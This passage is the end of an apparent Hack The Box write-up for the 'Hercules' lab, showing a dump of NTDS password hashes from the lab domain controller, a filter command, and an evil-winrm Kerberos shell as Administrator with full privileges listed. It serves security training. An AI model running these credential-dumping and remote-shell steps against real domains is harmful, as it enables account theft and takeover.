+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_webserver$:1124:aad3b435b51404eeaad3b435b51404ee:a9f4d76cdc5ba32d6e0763da9d106eb7:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_hadesapppool$:1125:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_apppoolidentity$:1126:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_defaultapppool$:1127:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\auditor:1128:aad3b435b51404eeaad3b435b51404ee:a9285c625af80519ad784729655ff325:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\vincent.g:1129:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\nate.h:1130:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\stephen.m:1131:aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\mark.s:1132:aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\elijah.m:1133:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\angelo.o:1134:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ashley.b:1135:aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\clarissa.c:1136:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\winda.s:1137:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\rene.s:1138:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\will.s:1139:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\zeke.s:1140:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\adriana.i:1141:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\tish.c:1142:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\jennifer.a:1143:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\shae.j:1144:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\joel.c:1145:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\jacob.b:1146:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\web_admin:1147:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\bob.w:1148:aad3b435b51404eeaad3b435b51404ee:8a65c74e8f0073babbfac6725c66cc3f:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ken.w:1149:aad3b435b51404eeaad3b435b51404ee:bbe608565f201166999904e40c967c7b:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\johnathan.j:1150:aad3b435b51404eeaad3b435b51404ee:5809e5fc2ca162d909b15c62d7c3707c:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\harris.d:1151:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ray.n:1152:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\natalie.a:1153:aad3b435b51404eeaad3b435b51404ee:a023eb224e137b1c28de1a50d12519d5:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ramona.l:1154:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\fiona.c:1155:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\patrick.s:1156:aad3b435b51404eeaad3b435b51404ee:08cbc306325b2ef9da7bbdb85e528613:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\tanya.r:1157:aad3b435b51404eeaad3b435b51404ee:08cbc306325b2ef9da7bbdb85e528613:::
+SMB         dc.hercules.htb 445    dc               Admin:5103:aad3b435b51404eeaad3b435b51404ee:ef0e8c35557ed7790eb8499fc1c24fb6:::
+SMB         dc.hercules.htb 445    dc               DC$:1000:aad3b435b51404eeaad3b435b51404ee:37229f3b87fa161bc3aeda8d67c6e44d:::
+SMB         dc.hercules.htb 445    dc               WINSRV01-2016$:1158:aad3b435b51404eeaad3b435b51404ee:989f931779b1379c6345b6e2773244a0:::
+SMB         dc.hercules.htb 445    dc               WINSRV02-2016$:1159:aad3b435b51404eeaad3b435b51404ee:bb32a35136321fb9cd41374a1a62b14a:::
+SMB         dc.hercules.htb 445    dc               WINSRV03-2016$:1160:aad3b435b51404eeaad3b435b51404ee:68f03b6856cf02e7c1ddac0758ca6b25:::
+SMB         dc.hercules.htb 445    dc               ENTERPRISE01-8.1$:1161:aad3b435b51404eeaad3b435b51404ee:dc6d40433d403e925d4f1848ceeef91f:::
+SMB         dc.hercules.htb 445    dc               ENTERPRISE02-8.1$:1162:aad3b435b51404eeaad3b435b51404ee:90ccdd29525c3b6d29428f932f754171:::
+SMB         dc.hercules.htb 445    dc               [+] Dumped 55 NTDS hashes to /home/kali/.nxc/logs/ntds/dc_dc.hercules.htb_2026-09-16_221634.ntds of which 45 were added to the database
+SMB         dc.hercules.htb 445    dc               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc.hercules.htb 445    dc               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc_dc.hercules.htb_2026-09-16_221634.ntds | cut -d &#39;:&#39; -f1</code></pre><p>Ill then dump the NTDS</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S -u Administrator
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>I can now get access as the DA</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>DOMAIN ADMIN!</p><p><img src="images/hercules/pasted-image-20260916222154.webp" alt="Screenshot" loading="lazy" /></p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-pirate/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Pirate</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-darkcorp/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">DarkCorp</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
